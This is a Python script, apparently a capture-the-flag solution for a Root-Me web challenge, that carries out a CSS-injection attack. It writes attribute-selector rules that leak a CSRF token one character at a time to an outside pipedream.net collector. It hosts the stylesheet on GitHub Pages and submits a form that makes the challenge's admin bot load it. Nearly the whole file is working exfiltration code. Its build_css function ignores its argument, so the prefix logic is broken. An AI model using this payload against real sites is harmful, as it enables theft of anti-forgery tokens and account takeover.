from time import sleep
import requests
import os

def build_css(chars):
    # supp du file
    os.remove("./a.css")

    # création du new file
    file = open("./a.css", "w") 
    file.write(""".csrf[value^=A] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/A); } 
.csrf[value^=B] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/B); } 
.csrf[value^=C] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/C); } 
.csrf[value^=D] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/D); } 
.csrf[value^=E] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/E); } 
.csrf[value^=F] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/F); } 
.csrf[value^=G] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/G); } 
.csrf[value^=H] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/H); } 
.csrf[value^=I] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/I); } 
.csrf[value^=J] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/J); } 
.csrf[value^=K] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/K); } 
.csrf[value^=L] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/L); } 
.csrf[value^=M] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/M); } 
.csrf[value^=N] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/N); } 
.csrf[value^=O] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/O); } 
.csrf[value^=P] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/P); } 
.csrf[value^=Q] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Q); } 
.csrf[value^=R] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/R); } 
.csrf[value^=S] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/S); } 
.csrf[value^=T] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/T); } 
.csrf[value^=U] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/U); } 
.csrf[value^=V] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/V); } 
.csrf[value^=W] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/W); } 
.csrf[value^=X] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/X); } 
.csrf[value^=Y] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Y); } 
.csrf[value^=Z] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/Z); } 
.csrf[value^=a] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/a); } 
.csrf[value^=b] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/b); } 
.csrf[value^=c] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/c); } 
.csrf[value^=d] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/d); } 
.csrf[value^=e] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/e); } 
.csrf[value^=f] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/f); } 
.csrf[value^=g] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/g); } 
.csrf[value^=h] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/h); } 
.csrf[value^=i] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/i); } 
.csrf[value^=j] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/j); } 
.csrf[value^=k] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/k); } 
.csrf[value^=l] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/l); } 
.csrf[value^=m] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/m); } 
.csrf[value^=n] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/n); } 
.csrf[value^=o] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/o); } 
.csrf[value^=p] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/p); } 
.csrf[value^=q] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/q); } 
.csrf[value^=r] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/r); } 
.csrf[value^=s] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/s); } 
.csrf[value^=t] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/t); } 
.csrf[value^=u] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/u); } 
.csrf[value^=v] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/v); } 
.csrf[value^=w] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/w); } 
.csrf[value^=x] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/x); } 
.csrf[value^=y] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/y); } 
.csrf[value^=z] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/z); } 
.csrf[value^=0] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/0); } 
.csrf[value^=1] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/1); } 
.csrf[value^=2] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/2); } 
.csrf[value^=3] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/3); } 
.csrf[value^=4] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/4); } 
.csrf[value^=5] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/5); } 
.csrf[value^=6] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/6); } 
.csrf[value^=7] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/7); } 
.csrf[value^=8] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/8); } 
.csrf[value^=9] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/9); } 
    """) 
    file.close()

# ----
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
know  = ""

# envoie à admin 


while 1:
    for elt in chars:
        print("eeeeeeeeeeeeeeeeeeeeeeeeeeeee : "+elt)
        # new css
        build_css(know+elt)
        sleep(10) # for not to ban

        # commit & push
        os.system('git add .')
        os.system('git commit -m "update css"')
        os.system('git push')

        # request POST
        # TODO: request post for aff in request bin car get et curl ne fonctionne pas
        data = {"name":"coutcout", "email":"a@gmail.com","url":"http://challenge01.root-me.org:58005/?style=https://kixisaleesd.github.io/test/a", "description":"e"}
        requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)

    know += input("new chars to know : ")